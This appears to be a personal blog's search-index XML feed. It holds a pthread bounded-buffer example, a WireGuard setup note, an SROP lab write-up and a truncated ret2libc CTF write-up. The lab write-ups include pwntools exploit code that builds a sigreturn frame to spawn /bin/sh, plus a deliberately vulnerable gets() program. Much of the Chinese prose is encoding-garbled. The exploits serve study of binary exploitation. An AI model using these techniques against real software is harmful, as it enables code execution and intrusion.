<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>OS Bounded Buffer</title>
      <link href="/2024/09/26/os-bbuff/"/>
      <url>/2024/09/26/os-bbuff/</url>
      
        <content type="html"><![CDATA[<h2 id="INTRO"><a href="#INTRO" class="headerlink" title="INTRO"></a>INTRO</h2><ol><li><p>å…±äº«è¨˜æ†¶é«”çš„è§£æ±ºæ–¹æ¡ˆ (Share memory Solution)<br> ä½¿ç”¨ä¸€å€‹å…±äº«çš„Bufferï¼ˆbounded bufferï¼‰ï¼Œé€™å€‹Bufferæœ‰å›ºå®šå¤§å°ï¼Œç”Ÿç”¢è€…å°‡æ•¸æ“šæ”¾å…¥Bufferï¼Œæ¶ˆè²»è€…å¾ä¸­å–å‡ºæ•¸æ“šã€‚ç‚ºäº†ä¿è­‰ç”Ÿç”¢è€…å’Œæ¶ˆè²»è€…ä¸æœƒåŒæ™‚è¨ªå•Bufferï¼Œä½¿ç”¨äº’æ–¥é– (mutex) å’Œå…©å€‹æ¢ä»¶è®Šé‡ (condition variables)ï¼Œä¸€å€‹ç”¨æ–¼é€šçŸ¥Bufferæœªæ»¿ (not full)ï¼Œå¦ä¸€å€‹ç”¨æ–¼é€šçŸ¥Bufferéç©º (not empty)ã€‚</p></li><li><p>ç”Ÿç”¢è€… (Producer)<br> ç”Ÿç”¢è€…çš„å·¥ä½œæ˜¯å°‡æ•¸æ“šæ”¾å…¥Bufferä¸­ï¼Œç•¶Bufferæ»¿æ™‚ï¼Œå®ƒæœƒç­‰å¾…æ¶ˆè²»è€…å–èµ°ä¸€äº›æ•¸æ“šä»¥é¨°å‡ºç©ºé–“ã€‚</p></li><li><p>æ¶ˆè²»è€… (Consumer)<br> æ¶ˆè²»è€…çš„å·¥ä½œæ˜¯å¾Bufferä¸­å–å‡ºæ•¸æ“šï¼Œç•¶Bufferç‚ºç©ºæ™‚ï¼Œå®ƒæœƒç­‰å¾…ç”Ÿç”¢è€…æ”¾å…¥æ–°çš„æ•¸æ“šã€‚</p></li><li><p>Main Funtion</p><ol><li>åˆå§‹åŒ– mutex</li><li><code>prod_thread, cons_thread</code> ä¿å­˜æ–°å»º Thread ID , å‰µå»ºç”Ÿç”¢è€…è·Ÿæ¶ˆè²»è€… Thread</li><li>ç­‰å¾… Thread å®Œæˆ</li><li>é‡‹æ”¾å®ƒå€‘ä½”ç”¨çš„è³‡æº (destory)</li></ol></li><li><p>LIB Function (pthread.h)</p><ol><li>pThread_t: <code>typedef __darwin_pthread_t pthread_t;</code><br><a class="link"   href="https://www.ibm.com/docs/zh-tw/aix/7.3?topic=p-pthread-mutex-lock-pthread-mutex-trylock-pthread-mutex-unlock-subroutine" > <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ol></li></ol><h3 id="IMPL"><a href="#IMPL" class="headerlink" title="IMPL"></a>IMPL</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 5  <span class="comment">// ç·©è¡å€å¤§å°</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> buffer[BUFFER_SIZE];  <span class="comment">// share memory buffer</span></span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;            <span class="comment">// data amount in buffer</span></span><br><span class="line"><span class="type">int</span> in = <span class="number">0</span>;               <span class="comment">// producer write position</span></span><br><span class="line"><span class="type">int</span> out = <span class="number">0</span>;              <span class="comment">// consumer read position</span></span><br><span class="line"></span><br><span class="line"><span class="type">pthread_mutex_t</span> mutex;  <span class="comment">// mutex lock for buffer</span></span><br><span class="line"><span class="type">pthread_cond_t</span> not_full;  <span class="comment">// not full condition variable for buffer</span></span><br><span class="line"><span class="type">pthread_cond_t</span> not_empty; <span class="comment">// not empty condition variable for buffer</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">producer</span><span class="params">(<span class="type">void</span>* param)</span>&#123;</span><br><span class="line">    <span class="type">int</span> item;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        item = rand() % <span class="number">100</span>; <span class="comment">//éš¨æ©Ÿç”Ÿæˆitem</span></span><br><span class="line">        pthread_mutex_lock(&amp;mutex); <span class="comment">// lock</span></span><br><span class="line">        <span class="keyword">while</span>(count == BUFFER_SIZE)&#123;</span><br><span class="line">            <span class="comment">//å¦‚æœç·©è¡å€å·²æ»¿ï¼Œç­‰å¾…not_fullæ¢ä»¶</span></span><br><span class="line">            pthread_cond_wait(&amp;not_full, &amp;mutex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// to buffer</span></span><br><span class="line">        buffer[in] = item;</span><br><span class="line">        in = (in + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line">        count++;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Producer produced: %d\n&quot;</span>, item);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// buffer not empty signal</span></span><br><span class="line">        pthread_cond_signal(&amp;not_empty);</span><br><span class="line">        pthread_mutex_unlock(&amp;mutex); <span class="comment">// unlock</span></span><br><span class="line">        sleep(<span class="number">1</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">consumer</span><span class="params">(<span class="type">void</span>* param)</span>&#123;</span><br><span class="line">    <span class="type">int</span> item;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        pthread_mutex_lock(&amp;mutex); <span class="comment">// lock</span></span><br><span class="line">        <span class="keyword">while</span> (count == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// if buffer is empty, wait for not_empty condition</span></span><br><span class="line">            pthread_cond_wait(&amp;not_empty, &amp;mutex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// get data from buffer</span></span><br><span class="line">        item = buffer[out];</span><br><span class="line">        out = (out + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line">        count--;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Consumer consumed: %d\n&quot;</span>, item);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// notify producer buffer not full</span></span><br><span class="line">        pthread_cond_signal(&amp;not_full);</span><br><span class="line">        pthread_mutex_unlock(&amp;mutex); <span class="comment">// unlock</span></span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">1</span>); <span class="comment">// simulate consumption time</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">pthread_t</span> producer_thread, consumer_thread;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// intialize mutex and condition variables</span></span><br><span class="line">    pthread_mutex_init(&amp;mutex, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_cond_init(&amp;not_full, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_cond_init(&amp;not_empty, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create producer and consumer threads</span></span><br><span class="line">    pthread_create(&amp;producer_thread, <span class="literal">NULL</span>, producer, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;consumer_thread, <span class="literal">NULL</span>, consumer, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// wait for threads to finish</span></span><br><span class="line">    pthread_join(producer_thread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(consumer_thread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// destroy mutex and condition variables</span></span><br><span class="line">    pthread_mutex_destroy(&amp;mutex);</span><br><span class="line">    pthread_cond_destroy(&amp;not_full);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wireguard VPN</title>
      <link href="/2024/08/31/wireguard/"/>
      <url>/2024/08/31/wireguard/</url>
      
        <content type="html"><![CDATA[<h2 id="Setup-wireguard-VPN"><a href="#Setup-wireguard-VPN" class="headerlink" title="Setup wireguard VPN"></a>Setup wireguard VPN</h2><blockquote><p>è¦å…ˆæœ‰ä¸€å°æ©Ÿå™¨</p><blockquote><p>ç§Ÿå€‹é›²æœå‹™éƒ½å¯ä»¥ï¼Œé€™é‚Šæ¨è–¦ <a class="link"   href="https://linode.com/" >Linode <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote></blockquote><p><code>sudo apt install wireguard</code></p><p><a class="link"   href="https://www.wireguard.com/install/" > <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="Config"><a href="#Config" class="headerlink" title="Config"></a>Config</h3><p>æ¨è–¦ä½¿ç”¨<a class="link"   href="https://www.wireguardconfig.com/" >é€™å€‹ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ç”Ÿconfigæª” (æˆ‘å°±æ‡¶ğŸ‘)</p><blockquote><p>ä¸ç„¶è¦ç”¨ <code>wg</code> ç”ŸServer,Client çš„ private&#x2F;public key ç„¶å¾Œå¯«conf</p></blockquote><p>æŠŠ Server File ä¸Ÿé€² <code>/etc/wireguard/wg0.conf</code> å¾Œ <code>wg-quick up wg0</code><br>client File ä¸Ÿé€² app</p><p>å°±è¡Œäº†ğŸ’¯</p><p>é€™å€‹æ”¹å®šä½æ²’ä»€éº¼ç”¨ï¼Œåªèƒ½æ”¹ipæ‰€ä»¥æœ‰GPSé©—è­‰çš„å¯èƒ½æ²’è¾¦æ³•è·³é</p>]]></content>
      
      
      
        <tags>
            
            <tag> vpn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LYS SROP lab WriteUp</title>
      <link href="/2024/08/20/srop-WriteUp/"/>
      <url>/2024/08/20/srop-WriteUp/</url>
      
        <content type="html"><![CDATA[<blockquote><p>srop (signal return oriented program)</p></blockquote><h2 id="Signal"><a href="#Signal" class="headerlink" title="Signal"></a>Signal</h2><p>ç•¶æ¥æ”¶åˆ°ä¸€å€‹sinalä¿¡è™Ÿ</p><ol><li><p>kernel æœƒæŠŠä¸Šä¸‹æ–‡ ( å„ç¨®æš«å­˜å™¨ ) ä¿ç•™åˆ° stack ä¸Šï¼Œå«åš Signal Frame</p></li><li><p>kernal å°‡é€²ç¨‹çš„æ§åˆ¶æµè½‰ç§»åˆ°ç”¨æˆ¶å®šç¾©çš„ä¿¡è™Ÿè™•ç†ç¨‹åºï¼ˆsignal handlerï¼‰ã€‚é€™å€‹è™•ç†ç¨‹åºæ˜¯<strong>ç”¨æˆ¶ç¨‹å¼</strong>ä¸­æŒ‡å®šçš„ä¸€æ®µä»£ç¢¼ï¼Œç”¨ä¾†è™•ç†ç‰¹å®šçš„ä¿¡è™Ÿã€‚</p></li><li><p>ä¿¡è™Ÿè™•ç†ç¨‹åºåŸ·è¡Œç”¨æˆ¶å®šç¾©çš„æ“ä½œï¼Œå¦‚æ‰“å°æ¶ˆæ¯ã€æ¸…ç†è³‡æºã€æˆ–è€…ä¿®æ”¹æŸäº›å…¨å±€ç‹€æ…‹ and retã€‚</p></li><li><p>ç•¶ä¿¡è™Ÿè™•ç†ç¨‹åºçµæŸå¾Œï¼Œæ§åˆ¶æµæœƒè·³è½‰åˆ°ä¸€å€‹åç‚º <code>__restore_rt</code> çš„å‡½æ•¸ã€‚é€™å€‹å‡½æ•¸å…§éƒ¨æœƒåŸ·è¡Œä¸€å€‹ç‰¹å®šçš„ç³»çµ±èª¿ç”¨æŒ‡ä»¤ï¼š</p> <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0xf  ; å°‡ç³»çµ±èª¿ç”¨è™Ÿ 0xf (sys_rt_sigreturn) æ”¾å…¥ RAX å¯„å­˜å™¨</span><br><span class="line">syscall       ; å‘¼å«ç³»çµ±èª¿ç”¨ï¼Œé€²å…¥å…§æ ¸æ¨¡å¼</span><br></pre></td></tr></table></figure></div></li><li><p>ä¸Šé¢é€™å€‹functionæœƒcall <code>sys_rt_sigreturn</code> å¾stackä¸­æå–å‡ºä¹‹å‰ä¿å­˜çš„ Signal Frameï¼Œä¸¦æ¢å¾©ä¸Šä¸‹æ–‡ï¼ŒåŒ…æ‹¬æ‰€æœ‰æš«å­˜å™¨çš„å€¼ã€‚ process å°‡ç¹¼çºŒå¾åŸä¾†ä¸­æ–·çš„ä½ç½®åŸ·è¡Œã€‚</p></li></ol><h2 id="Srop"><a href="#Srop" class="headerlink" title="Srop"></a>Srop</h2><p>rop éœ€è¦è¨­å®šæ¯ä¸€å€‹rigisterçš„å€¼<br>é€™æ™‚å€™åœ¨ stack ä¸Šæ“ºå¥½ Signal Frameï¼Œç„¶å¾Œå‘¼å« sys_rt_sigreturn syscallï¼Œåˆ©ç”¨sropå°±å¯ä»¥ä¸€æ¬¡è¨­å®šå¥½å…¨éƒ¨çš„rigster</p><p>å„ªé»ï¼šæ•ˆç‡é«˜ï¼Œç°¡åŒ–rop chain<br>ç¼ºé»ï¼šéœ€è¦è¼ƒå¤§çš„stackç©ºé–“</p><h3 id="rt-sigreturn"><a href="#rt-sigreturn" class="headerlink" title="rt_sigreturn"></a><code>rt_sigreturn</code></h3><p>ä¸€æ¨£ç”¨å‰é¢xorçš„æ‰‹æ³•æŠŠraxè¨­å®šæˆ 0xfï¼Œ <code>mov rax, 0xf; syscall</code> ï¼Œä»–å°±æœƒ call åˆ° <code>rt_sigreturn</code></p><blockquote><p>find 0xf in <a class="link"   href="https://x64.syscall.sh/" >syscall <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><h2 id="LYS-lab-srop"><a href="#LYS-lab-srop" class="headerlink" title="LYS lab_srop"></a>LYS lab_srop</h2><p>åŸºæœ¬åŸç†ï¼šåœ¨Linuxä¸­ï¼Œä¿¡è™Ÿè™•ç†éç¨‹ä¸­ä½¿ç”¨äº†ä¸€å€‹åç‚ºsigreturnçš„ç³»çµ±èª¿ç”¨ï¼Œå®ƒæœƒå¾å †ç–Šä¸­æ¢å¾©å¯„å­˜å™¨çš„ç‹€æ…‹ã€‚ç•¶ä¸€å€‹ä¿¡è™Ÿè™•ç†ç¨‹åºçµæŸæ™‚ï¼Œç³»çµ±æœƒè‡ªå‹•èª¿ç”¨ sigreturn ä¾†æ¢å¾©ç¨‹å¼çš„åŸ·è¡Œç‹€æ…‹ã€‚</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~/pwn/srop# objdump -d -M intel srop</span><br><span class="line"></span><br><span class="line">srop:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000401000 &lt;.text&gt;:</span><br><span class="line">  401000:       48 31 c0                xor    rax,rax</span><br><span class="line">  401003:       ba 00 04 00 00          mov    edx,0x400</span><br><span class="line">  401008:       48 89 e6                mov    rsi,rsp</span><br><span class="line">  40100b:       48 89 c7                mov    rdi,rax</span><br><span class="line">  40100e:       0f 05                   syscall </span><br><span class="line">  401010:       c3                      ret    </span><br></pre></td></tr></table></figure></div><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/srop-syscall2.png"                      alt="image"                ></p><blockquote><p>ä¾ç…§syscallè¡¨çŸ¥é“<code>*buf</code>æŒ‡å‘ <code>rsp</code></p></blockquote><h2 id="set-rax"><a href="#set-rax" class="headerlink" title="set rax"></a>set rax</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/srop-setrax.png"                      alt="image"                ></p><p>é€éè“‹å›<code>x/03</code>è¨­å®š <code>rax</code> æˆ1ï¼Œå¾Œå°±å¯ä»¥writeå‡ºrspçš„å…§å®¹ï¼Œç¸½å…± 0x400</p><h3 id="stack-frame"><a href="#stack-frame" class="headerlink" title="stack frame"></a>stack frame</h3><p>æœ€å¾Œç…§ lys ç°¡å ±å¡«ä¸Šï¼Œ<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/srop_frame.png"                      alt="Alt text"                ></p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><blockquote><p>é ç«¯é—œäº†ï¼Œæœ¬åœ°è¦é–‹tmux</p></blockquote><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;./srop&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¼¸å…¥æœƒå¡«é€²rsi</span></span><br><span class="line"></span><br><span class="line">p = flat(<span class="number">0x401000</span>,<span class="number">0x401003</span>,<span class="number">0x401000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.sendline(p)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">b&#x27;\x03&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.recv(<span class="number">0x240</span>)</span><br><span class="line"></span><br><span class="line">rsp = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x281</span></span><br><span class="line">success(<span class="string">&quot;rsp -&gt; %s&quot;</span>, <span class="built_in">hex</span>(rsp)) </span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">p2 = flat(</span><br><span class="line">    <span class="number">0x401000</span>,<span class="number">0x40100e</span>,</span><br><span class="line">    [<span class="number">0</span>]*<span class="number">13</span>,</span><br><span class="line">    rsp+<span class="number">272</span>, <span class="comment"># rdi -&gt; &#x27;/bin/sh&#x27;</span></span><br><span class="line">    [<span class="number">0</span>]*<span class="number">4</span>,  <span class="comment"># rsi,rbp,rbx,rdx</span></span><br><span class="line">    <span class="number">0x3b</span>,   <span class="comment"># rax</span></span><br><span class="line">    <span class="number">0x0</span>,<span class="number">0</span>,</span><br><span class="line">    <span class="number">0x40100e</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x33</span>,</span><br><span class="line">    [<span class="number">0</span>]*<span class="number">8</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(p2))</span><br><span class="line">p2 += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">r.send(p2)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">r.send(p2[<span class="number">8</span>:][:<span class="number">15</span>])</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><h3 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h3><p><a class="link"   href="https://kazma.tw/2024/08/05/LYS-Rop-lab-srop-Writeup/" >kazma.tw LYS-Rop-lab-srop-Writeup <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://oalieno.tw/2019/09/18/srop/" >oalieno.tw srop <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCKUCTF ret2libc2024 WriteUp</title>
      <link href="/2024/08/16/ncku-ctf-ret2libc2024-WriteUp/"/>
      <url>/2024/08/16/ncku-ctf-ret2libc2024-WriteUp/</url>
      
        <content type="html"><![CDATA[<h2 id="ret2lbic2024"><a href="#ret2lbic2024" class="headerlink" title="ret2lbic2024"></a>ret2lbic2024</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Can you exploit buffer overflow in 2024?&quot;</span>);</span><br><span class="line">    gets(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><hr><blockquote><p>èƒ½ç”¨çš„gadgetéƒ½æ²’æœ‰ï¼Œæˆ‘å€‘å¯ä»¥ä½¿ç”¨ <code>deregister_tm_clones</code> é€™å€‹ function æœ‰å€‹ç¥å¥‡çš„æ±è¥¿ (å¦‚ä¸‹åœ–)<br>é€™é‚Šå°±æœƒç›´æ¥å¹«æˆ‘å€‘æŠŠraxè¨­ç‚º0x404040ï¼ˆä¹Ÿå°±æ˜¯<a class="link"   href="mailto:&#x73;&#x74;&#x64;&#x6f;&#117;&#116;&#64;&#71;&#x4c;&#73;&#66;&#67;&#95;&#x32;&#x2e;&#x32;&#46;&#53;" >&#x73;&#x74;&#x64;&#x6f;&#117;&#116;&#64;&#71;&#x4c;&#73;&#66;&#67;&#95;&#x32;&#x2e;&#x32;&#46;&#53; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ï¼Œcall å®Œé€™å€‹ function å¾Œï¼Œæˆ‘å€‘åªéœ€è¦ call å› main ä¸­æ§åˆ¶ printf çš„ <code>mov rdi,rax</code> å°±å¯ä»¥ leak å‡º libc baseï¼Œå¾Œé¢ä¸€æ¨£ç”¨ libc å † rop chain å°±å¯ä»¥äº†ã€‚</p></blockquote><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/rop4-detmclone.png"                      alt="image"                ></p><hr><ul><li>åœ¨leakçš„æ™‚å€™éœ€è¦æ³¨æ„ä¸èƒ½æŠŠ<code>$rbp</code>å¯«å£ï¼Œå› ç‚ºä¸‹æ¬¡<code>gets()</code>é‚„éœ€è¦ä¸€å€‹stackç©ºé–“å­˜æ±è¥¿ï¼Œæ‰€ä»¥éš¨ä¾¿æ‰¾ä¸€å€‹å¯å¯«çš„ç©ºé–“çµ¦<code>$rbp</code>è·³éå»å¾Œé¢æ‰ä¸æœƒcrashæ‰ã€‚</li><li>ç‚ºä»€éº¼ offset ä¸æ˜¯ç”¨ <code>stdout@@GLIBC_2.2.5</code><br>  <code>stdout@@GLIBC_2.2.5</code> æ˜¯ä¸€å€‹æŒ‡å‘ <code>_IO_2_1_stdout_</code> çµæ§‹çš„æŒ‡æ¨™ï¼Œè€Œ <code>_IO_2_1_stdout_</code> æ˜¯å¯¦éš›çš„ FILE çµæ§‹é«”ã€‚<br>  ä½¿ç”¨ <code>_IO_2_1_stdout_</code> å¯ä»¥ç›´æ¥æ“ä½œè©²çµæ§‹é«”çš„memoryï¼Œè€Œä¸æ˜¯é€šéæŒ‡æ¨™é–“æ¥è¨ªå•å®ƒã€‚é€™æ¨£å¯ä»¥é¿å…åç§»è¨ˆç®—ä¸­çš„éŒ¯èª¤ï¼Œä¹Ÿå¯ä»¥æ›´ç²¾ç¢ºåœ°æ§åˆ¶å…§å­˜ä¸­çš„å€¼ã€‚</li></ul><hr><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span 